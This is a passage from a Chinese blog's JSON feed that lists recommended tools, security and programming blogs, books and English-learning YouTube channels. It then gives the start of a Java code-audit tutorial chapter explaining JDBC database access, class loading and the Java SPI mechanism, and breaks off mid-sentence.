      "content_html": "\n<p><a href=\"https://nilesoft.org/\" target=\"_blank\" rel=\"noopener noreferrer\">shell</a>：一个小软件，修改windows右键，很实用包括转至一些系统文件夹，按shift以管理员运行终端等</p>\n<p><a href=\"https://zh.snipaste.com/\" target=\"_blank\" rel=\"noopener noreferrer\">snipaste</a>：F1截图 F3贴图，可以让截图悬浮在任意位置，方便做些对比</p>\n<p><a href=\"https://wechat2rss.xlab.app/list/\" target=\"_blank\" rel=\"noopener noreferrer\">Wechat2RSS</a>：公开提供部分公众号RSS，支持私有部署</p>\n<h1>宝藏博客</h1>\n<p><a href=\"https://blog.qizong007.top/\" target=\"_blank\" rel=\"noopener noreferrer\">王帅真 | 王帅真的个人博客，分享编程与思维认知</a></p>\n<p><a href=\"https://payloads.cn/\" target=\"_blank\" rel=\"noopener noreferrer\">AnonySec'Blog (payloads.cn)</a>：网安类</p>\n<p><a href=\"https://www.cnblogs.com/mt0u\" target=\"_blank\" rel=\"noopener noreferrer\">mt0u - 博客园 (cnblogs.com)</a>：网安类</p>\n<p><a href=\"https://www.geekby.site/\" target=\"_blank\" rel=\"noopener noreferrer\">Geekby's Blog</a>：网安类</p>\n<p><a href=\"https://www.leavesongs.com/\" target=\"_blank\" rel=\"noopener noreferrer\">首页 | 离别歌 (leavesongs.com)</a>：大神phith0n</p>\n<p><a href=\"https://ares-x.com/\" target=\"_blank\" rel=\"noopener noreferrer\">AresX's Blog (ares-x.com)</a>：网安类</p>\n<p><a href=\"https://3gstudent.github.io/\" target=\"_blank\" rel=\"noopener noreferrer\">3gstudent-Blog</a>：网安类</p>\n<h1>宝藏知识</h1>\n<h2>编程基础</h2>\n<p><a href=\"https://golang-china.github.io/gopl-zh/\" target=\"_blank\" rel=\"noopener noreferrer\">Go语言圣经 - Go语言圣经</a> 以为很不错，后面开始英文直译，简单原理复杂化。</p>\n<h2>计算机基础</h2>\n<p>《深入理解计算机系统》<a href=\"https://hansimov.gitbook.io/csapp\" target=\"_blank\" rel=\"noopener noreferrer\">《CSAPP》</a></p>\n<h2>后端系统设计</h2>\n<p>《数据秘籍型应用系统设计》<a href=\"https://github.com/Vonng/ddia\" target=\"_blank\" rel=\"noopener noreferrer\">《DDIA》</a></p>\n<h2>工程</h2>\n<p><a href=\"https://book.douban.com/subject/35948443/\" target=\"_blank\" rel=\"noopener noreferrer\">《卓有成效的工程师》</a>🌟 软件工程师必读</p>\n<p><a href=\"https://qiangmzsx.github.io/Software-Engineering-at-Google/#/zh-cn/Foreword\" target=\"_blank\" rel=\"noopener noreferrer\">《Google软件工程》</a>🌟 软件工程师必读</p>\n<p><a href=\"https://migration.ink/\" target=\"_blank\" rel=\"noopener noreferrer\">《系统重构与迁移指南》</a>🌟 系统重构/迁移必读</p>\n<h2>Coding</h2>\n<p><a href=\"https://book.douban.com/subject/1477390/\" target=\"_blank\" rel=\"noopener noreferrer\">《代码大全》</a>🌟 Coder枕边必读</p>\n<p><a href=\"https://book.douban.com/subject/3227098/\" target=\"_blank\" rel=\"noopener noreferrer\">《编程珠玑》</a>🌟 集算法于实践之中的好书，不会空浮于理论</p>\n<p><a href=\"https://book.douban.com/subject/5376270/\" target=\"_blank\" rel=\"noopener noreferrer\">《调试九法》</a>🌟 Debug必读</p>\n<p><a href=\"https://search.douban.com/book/subject_search?search_text=%E9%87%8D%E6%9E%84&amp;cat=1001\" target=\"_blank\" rel=\"noopener noreferrer\">《重构》</a>🌟 重构必读</p>\n<p><a href=\"https://book.douban.com/subject/2248759/\" target=\"_blank\" rel=\"noopener noreferrer\">《修改代码的艺术》</a></p>\n<h1>英语学习</h1>\n<blockquote>\n<p>收藏从未停止，学习从未开始~</p>\n</blockquote>\n<h3><a class=\"header-anchor\" href=\"#编程相关\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3\" target=\"_blank\" rel=\"noopener noreferrer\">编程相关</a></h3>\n<ul>\n<li><a href=\"https://laracasts.com/\" target=\"_blank\" rel=\"noopener noreferrer\">laracasts</a> 推荐指数：5</li>\n</ul>\n<p>这是一个关于前端和 PHP 框架 Laravel 的视频教程网站，内容更新及时，讲解细致，大部分内容免费，对刚入门的程序员很友好。 教程内容涉及 JavaSrcipt/Vue.js/React/Laravel/PHP/编辑器的进阶教程等。 很喜欢他的那句口头禅 <em>Does it make sense to you?</em></p>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UCVTlvUkGslCV_h-nSAId8Sw\" target=\"_blank\" rel=\"noopener noreferrer\">LearnCode.academy</a> 推荐指数：5</li>\n</ul>\n<p>如果你想学习 React/Redux/MobX/AngularJS/NodeJS/Docker 等，这里会是你愿意花很多时间待的地方</p>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UC29ju8bIPH5as8OGnQzwJyA\" target=\"_blank\" rel=\"noopener noreferrer\">Traversy Media</a> 推荐指数：5</li>\n</ul>\n<p>也是关于前端的一个很棒的频道，作者是个可爱的大胖子，内容覆盖面广，更新及时。作者发音较为标准，且速度较慢，新手也不会觉得吃力。</p>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UCwRXb5dUK4cvsHbx-rGzSgw\" target=\"_blank\" rel=\"noopener noreferrer\">Derek Banas</a> 推荐指数：4</li>\n</ul>\n<p>Derek 制作的 <em>一个视频学习一门语言</em> 的教程系列可以帮助你快速了解一些流行编程语言的基础语法,不过单位时间内包含的信息量大且语速稍快，适合有一定基础的同学。</p>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UCW5YeuERMmlnqo4oq8vwUpg\" target=\"_blank\" rel=\"noopener noreferrer\">The Net Ninja 10</a> 推荐指数：4</li>\n</ul>\n<p>前端学习很棒的一个频道，较早的内容开头的忍者语音有点吓人，近期的视频开头已经替换为相对友好的提示音。该频道 CSS/Sass 相关的教程值得推荐。</p>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UCyIe-61Y8C4_o-zZCtO4ETQ\" target=\"_blank\" rel=\"noopener noreferrer\">DevTips</a> 推荐指数：4</li>\n</ul>\n<p>这是一个对刚入门的前端程序员友好的频道，细致的基础内容，CSS、JQuery 相关的内容值得推荐。</p>\n<ul>\n<li><a href=\"https://egghead.io/\" target=\"_blank\" rel=\"noopener noreferrer\">egghead.io</a> 推荐指数：4</li>\n</ul>\n<p>拥有较为丰富的前端课程，小部分免费。</p>\n<h3><a class=\"header-anchor\" href=\"#youtube-频道推荐\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=youtube-%E9%A2%91%E9%81%93%E6%8E%A8%E8%8D%90\" target=\"_blank\" rel=\"noopener noreferrer\">YouTube 频道推荐</a></h3>\n<ul>\n<li>\n<p>[EnglishLessons4U - Learn English with Ronnie! <a href=\"https://www.youtube.com/user/EnglishLessons4U\" target=\"_blank\" rel=\"noopener noreferrer\">engVid]</a></p>\n<p><strong>力荐</strong> 学习英语的基础语法，很多小技巧都挺实用。最最重要的是，Ronnie 老师实在是太幽默啦，学习的过程中你会感受到快乐！</p>\n</li>\n<li>\n<p><a href=\"https://www.youtube.com/channel/UCz4tgANd4yy8Oe0iXCdSWfA\" target=\"_blank\" rel=\"noopener noreferrer\">English with Lucy!</a></p>\n<p>妹纸很漂亮，和我当年的大学英语老师有的一拼。</p>\n</li>\n<li>\n<p><a href=\"https://www.youtube.com/channel/UCrJHj7MDQhmQ9iFuACdoWCg\" target=\"_blank\" rel=\"noopener noreferrer\">EnglishAnyone</a></p>\n<p>教你说流利英语,因为作者的发音清晰、标准，设计的内容也比较贴近日常生活，是练习听力很棒的频道</p>\n</li>\n<li>\n<p><a href=\"https://www.youtube.com/channel/UCxJGMJbjokfnr2-s4_RXPxQ\" target=\"_blank\" rel=\"noopener noreferrer\">Speak English With Vanessa</a></p>\n<p>Vanessa 老师给人一种热情、乐观的感觉，发音标准，声情并茂。</p>\n</li>\n<li>\n<p><a href=\"https://www.youtube.com/channel/UCrRiVfHqBIIvSgKmgnSY66g/\" target=\"_blank\" rel=\"noopener noreferrer\">mmmEnglish</a></p>\n<p>Emma 老师的发音柔软清透、温和迷人。</p>\n</li>\n<li>\n<p><a href=\"https://www.youtube.com/channel/UC9eIq7PwD0WA-2B_Sp7xGdw\" target=\"_blank\" rel=\"noopener noreferrer\">English Fluency Journey</a></p>\n<p>跟着 Anna 老师学习对话，受益良多。</p>\n</li>\n</ul>\n<h3><a class=\"header-anchor\" href=\"#超级英雄电影爱好者不该错过的频道\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E8%B6%85%E7%BA%A7%E8%8B%B1%E9%9B%84%E7%94%B5%E5%BD%B1%E7%88%B1%E5%A5%BD%E8%80%85%E4%B8%8D%E8%AF%A5%E9%94%99%E8%BF%87%E7%9A%84%E9%A2%91%E9%81%93\" target=\"_blank\" rel=\"noopener noreferrer\">超级英雄电影爱好者不该错过的频道</a></h3>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UClVbhSLxwws-KSsPKz135bw\" target=\"_blank\" rel=\"noopener noreferrer\">TopMovieClip</a> 漫威超级英雄电影精彩剪辑，很养眼。</li>\n<li><a href=\"https://www.youtube.com/channel/UC8BQGqcCSFq6RC9feEGUGFA\" target=\"_blank\" rel=\"noopener noreferrer\">BestClips 4</a> 超级英雄电影相关</li>\n</ul>\n<h3><a class=\"header-anchor\" href=\"#脱口秀类节目\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E8%84%B1%E5%8F%A3%E7%A7%80%E7%B1%BB%E8%8A%82%E7%9B%AE\" target=\"_blank\" rel=\"noopener noreferrer\">脱口秀类节目</a></h3>\n<ul>\n<li><a href=\"https://www.youtube.com/channel/UCa6vGFO9ty8v5KZJXQxdhaw\" target=\"_blank\" rel=\"noopener noreferrer\">Jimmy Kimmel Live</a> 鸡毛秀</li>\n<li><a href=\"https://www.youtube.com/channel/UCp0hYYBW6IMayGgR-WeoCvQ\" target=\"_blank\" rel=\"noopener noreferrer\">TheEllenShow</a> 艾伦秀</li>\n<li><a href=\"https://www.youtube.com/channel/UCMtFAi84ehTSYSE9XoHefig\" target=\"_blank\" rel=\"noopener noreferrer\">The Late Show with Stephen Colbert</a> Late 秀</li>\n</ul>\n<h3><a class=\"header-anchor\" href=\"#音乐频道\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E9%9F%B3%E4%B9%90%E9%A2%91%E9%81%93\" target=\"_blank\" rel=\"noopener noreferrer\">音乐频道</a></h3>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=mwfg8YmZM3E\" target=\"_blank\" rel=\"noopener noreferrer\">Valerie Pola</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=39_OmBO9jVg\" target=\"_blank\" rel=\"noopener noreferrer\">Luciana Zogbi</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=2jZFsQS8Veo\" target=\"_blank\" rel=\"noopener noreferrer\">Sara Farell</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=MhQKe-aERsU\" target=\"_blank\" rel=\"noopener noreferrer\">JFla</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=HcQJzFzZfVI\" target=\"_blank\" rel=\"noopener noreferrer\">Boyce Avenue</a></li>\n<li><a href=\"https://www.youtube.com/c/xooos\" target=\"_blank\" rel=\"noopener noreferrer\">xooos</a></li>\n<li><a href=\"https://www.youtube.com/channel/UCWfytcGFwPSMwvP5HYuXGqw\" target=\"_blank\" rel=\"noopener noreferrer\">Hailee Steinfeld</a></li>\n</ul>\n<h3><a class=\"header-anchor\" href=\"#其他\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E5%85%B6%E4%BB%96\" target=\"_blank\" rel=\"noopener noreferrer\">其他</a></h3>\n<ul>\n<li><a href=\"https://www.youtube.com/user/WaltDisneyStudiosUK\" target=\"_blank\" rel=\"noopener noreferrer\">Disney UK</a> 冰雪奇缘主题曲 FROZEN 的播放量高达 10 亿+!</li>\n<li><a href=\"https://www.youtube.com/user/VEVO\" target=\"_blank\" rel=\"noopener noreferrer\">Vevo</a> 电影级 MV 的集中营呀,VEVO 旗下有很多视频都有单独的频道，请自行查找感兴趣的</li>\n<li><a href=\"https://www.youtube.com/user/OneDirectionVEVO\" target=\"_blank\" rel=\"noopener noreferrer\">OneDirectionVEVO</a> OneDirection 粉应该关注的频道</li>\n<li><a href=\"https://www.youtube.com/channel/UCmKdSrwf1e8coqAzUsrVHZw\" target=\"_blank\" rel=\"noopener noreferrer\">SiaVEVO</a> 个人非常喜欢，视频质量感人，引人深思</li>\n<li><a href=\"https://www.youtube.com/channel/UCpB959t8iPrxQWj7G6n0ctQ\" target=\"_blank\" rel=\"noopener noreferrer\">SSSniperWolf</a> 一只可爱的妹子。</li>\n<li><a href=\"https://www.youtube.com/channel/UCAuUUnT6oDeKwE6v1NGQxug\" target=\"_blank\" rel=\"noopener noreferrer\">TED 6</a> TED Talks,听听别人的 idea 是一件很有意思的事情，建议从热门的开始看，TED Talks 的热门视频往往都有多国语言字幕。</li>\n</ul>\n<h3><a class=\"header-anchor\" href=\"#单独推荐的-youtube-视频\"><span></span></a><a href=\"https://byoungd.github.io/English-level-up-tips/#/part-1/3-listening?id=%E5%8D%95%E7%8B%AC%E6%8E%A8%E8%8D%90%E7%9A%84-youtube-%E8%A7%86%E9%A2%91\" target=\"_blank\" rel=\"noopener noreferrer\">单独推荐的 YouTube 视频</a></h3>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=w-HYZv6HzAs\" target=\"_blank\" rel=\"noopener noreferrer\">自信的技巧 - 伊万•约瑟夫博士 - TEDxRyersonU</a> | <a href=\"http://v.youku.com/v_show/id_XMjgyMDQwMDc4MA==.html\" target=\"_blank\" rel=\"noopener noreferrer\">优酷链接</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=l96V7dQtq9E\" target=\"_blank\" rel=\"noopener noreferrer\">说流利英语的一个小技巧</a> | <a href=\"http://v.youku.com/v_show/id_XMjc2MzE0NTQ4NA==.html\" target=\"_blank\" rel=\"noopener noreferrer\">优酷链接</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=eIho2S0ZahI\" target=\"_blank\" rel=\"noopener noreferrer\">朱利安·特瑞雪: 怎样说话人们才会听</a> | <a href=\"http://www.bilibili.com/video/av2915315/\" target=\"_blank\" rel=\"noopener noreferrer\">B 站链接</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=2vjPBrBU-TM\" target=\"_blank\" rel=\"noopener noreferrer\">Sia - Chandelier (Official Video)</a> | <a href=\"http://v.youku.com/v_show/id_XMjgyMDQxMjMwNA==.html\" target=\"_blank\" rel=\"noopener noreferrer\">优酷链接</a></li>\n</ul>\n",
      "date_published": "2024-07-15T07:45:51.000Z",
      "date_modified": "2024-11-13T10:11:39.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "3-数据库",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/3-Database.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/3-Database.html",
      "summary": "3-数据库\n执行sql语句的几种方式：JDBC、Hibernate、Mybatis，三者区别如下：\n\njdbc是较底层的持久化操作方式，而hibernate和mybatis都是在jdbc的基础上进行了封装使其更加方便程序运对持久层的操作。\njdbc就是先创建connection连接数据库，然后创建statement对象，通过statement对象执行s...",
      "content_html": "\n<p>执行sql语句的几种方式：JDBC、Hibernate、Mybatis，三者区别如下：</p>\n<ul>\n<li>jdbc是较底层的持久化操作方式，而hibernate和mybatis都是在jdbc的基础上进行了封装使其更加方便程序运对持久层的操作。</li>\n<li>jdbc就是先创建connection连接数据库，然后创建statement对象，通过statement对象执行sql语句，得到resultSet对象，通过对resultSet对象的遍历操作来获取数据并手动转为javaBean，最后关闭resultSet、statement、connection释放资源；hibernate是将数据库中的数据表映射为持久层的java对象，对sql语句修改和优化困难；mybatis将sql语句的输入参数和输出参数映射为java对象，sql语句修改和优化方便；</li>\n<li>若进行底层编程，且对性能要求极高的话，应采用jdbc方式；若对数据库进行完整性控制的话建议使用hibernate；若灵活使用sql语句的话建议使</li>\n</ul>\n<h2>1、JDBC</h2>\n<p>JDBC(Java Database Connectivity)，是Java连接数据库操作的原生接口。JDBC是所有框架操作数据库所必须的，是数据库的统一接口标准。</p>\n<h3>1.1 一般步骤</h3>\n<ol>\n<li>使用JDBC编程需要链接数据库，注册驱动和数据库信息。</li>\n<li>操作Connection，打开Statement对象。</li>\n<li>通过Statement执行SQL语句，返回结果放到ResultSet对象。</li>\n<li>使用ResultSet读取数据。</li>\n<li>关闭数据库相关的资源。</li>\n</ol>\n<p>数据库：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>CREATE DATABASE IF NOT EXISTS CodeAudit;\nuse CodeAudit;\nCREATE TABLE users (\n  ID INT,\n  name VARCHAR(50),\n  phone VARCHAR(20)\n);\nINSERT INTO users (ID, name, phone) VALUES\n(1, 'John Doe', '123-456-7890'),\n(2, 'Jane Smith', '987-654-3210'),\n(3, 'Alice Johnson', '555-123-4567'),\n(4, 'Bob Thompson', '888-999-0000');\n</code></pre></div><p>先添加pom依赖</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;mysql&lt;/groupId&gt;\n            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;\n            &lt;version&gt;5.1.47&lt;/version&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n</code></pre></div><p>然后按照上面的步骤</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/12/31 11:41\n * @Description :\n */</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>sql<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JDBCTestMain</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">JDBC_DRIVER</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"com.mysql.jdbc.Driver\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">DB_URL</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"jdbc:mysql://localhost/CodeAudit\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">USER</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"root\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">final</span> <span class=\"token class-name\">String</span> <span class=\"token constant\">PASS</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"123456\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Connection</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Statement</span> statement <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">ResultSet</span> resultSet <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JDBC_DRIVER</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//注册驱动，Class.forName(\"数据库驱动的类名\")。</span>\n<span class=\"token comment\">//            Driver driver = new com.mysql.jdbc.Driver(); //实例化com.mysql.jdbc.Driver，类加载即会执行静态代码块</span>\n<span class=\"token comment\">//            DriverManager.registerDriver(new com.mysql.jdbc.Driver()); //使用 `DriverManager` 类的 `registerDriver` 方法来实例化驱动程序：</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Connecting to database...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            connection <span class=\"token operator\">=</span> <span class=\"token class-name\">DriverManager</span><span class=\"token punctuation\">.</span><span class=\"token function\">getConnection</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DB_URL</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">USER</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PASS</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//获取连接，DriverManager.getConnection(xxx)。</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Creating statement...\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            statement <span class=\"token operator\">=</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">createStatement</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//操作Connection，打开Statement对象。</span>\n            <span class=\"token class-name\">String</span> sql<span class=\"token punctuation\">;</span>\n            sql <span class=\"token operator\">=</span> <span class=\"token string\">\"SELECT * from users\"</span><span class=\"token punctuation\">;</span>\n            resultSet <span class=\"token operator\">=</span> statement<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//通过Statement执行SQL语句，返回结果放到ResultSet对象。</span>\n            <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>resultSet<span class=\"token punctuation\">.</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token comment\">// 下面使用ResultSet读取数据。</span>\n                <span class=\"token keyword\">int</span> <span class=\"token class-name\">PKey</span> <span class=\"token operator\">=</span> resultSet<span class=\"token punctuation\">.</span><span class=\"token function\">getInt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"id\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> resultSet<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">String</span> phone <span class=\"token operator\">=</span> resultSet<span class=\"token punctuation\">.</span><span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"phone\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PKey: \"</span> <span class=\"token operator\">+</span> <span class=\"token class-name\">PKey</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", name: \"</span> <span class=\"token operator\">+</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\", phone: \"</span> <span class=\"token operator\">+</span> phone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">SQLException</span> se<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            se<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">finally</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 关闭数据库相关的资源</span>\n            <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>resultSet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>statement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>connection<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AutoCloseable</span> autoCloseable<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>autoCloseable <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n                autoCloseable<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RuntimeException</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上图代码里面有一个<code>Class.forName(\"com.mysql.jdbc.Driver\")</code>实际上会触发类加载，<code>com.mysql.jdbc.Driver</code>类将会被初始化，所以<code>static静态语句块</code>中的代码也将会被执行，如下图源码：</p>\n<figure><figcaption>image-20231231132427138</figcaption></figure>\n<p>其实也可以换个方法触发类加载，即实例化<code>com.mysql.cj.jdbc.Driver</code>或<code>com.mysql.jdbc.Driver</code>类加载即会执行静态代码块，如上面代码中注释掉的部分。</p>\n<blockquote>\n<p>如果反射某个类又不想初始化类方法有两种途径：</p>\n<ol>\n<li>使用<code>Class.forName(\"xxxx\", false, loader)</code>方法，将第二个参数传入false。</li>\n<li>ClassLoader.load(\"xxxx\");</li>\n</ol>\n</blockquote>\n<p><strong>删掉Class.forName()反射会发现依旧正常执行不报错：</strong></p>\n<p>这里利用了Java的一大特性:<code>Java SPI(Service Provider Interface)</code>，因为<code>DriverManager</code>在初始化的时候会调用<code>java.util.ServiceLoader</code>类提供的SPI机制，Java会自动扫描jar包中的<code>META-INF/services</code>目录下的文件，并且还会自动的<code>Class.forName(文件中定义的类)</code>，这也就解释了为什么不需要<code>Class.forName</code>也能够成功连接数据库的原因了</p>\n<h3>1.2 数据源</h3>\n<p>虽然可以直接使用 JDBC 驱动程序来创建和管理数据库连接，但使用数据源（DataSource）提供了更好的连接管理和资源控制的机制。以下是 JDBC 使用 DataSource 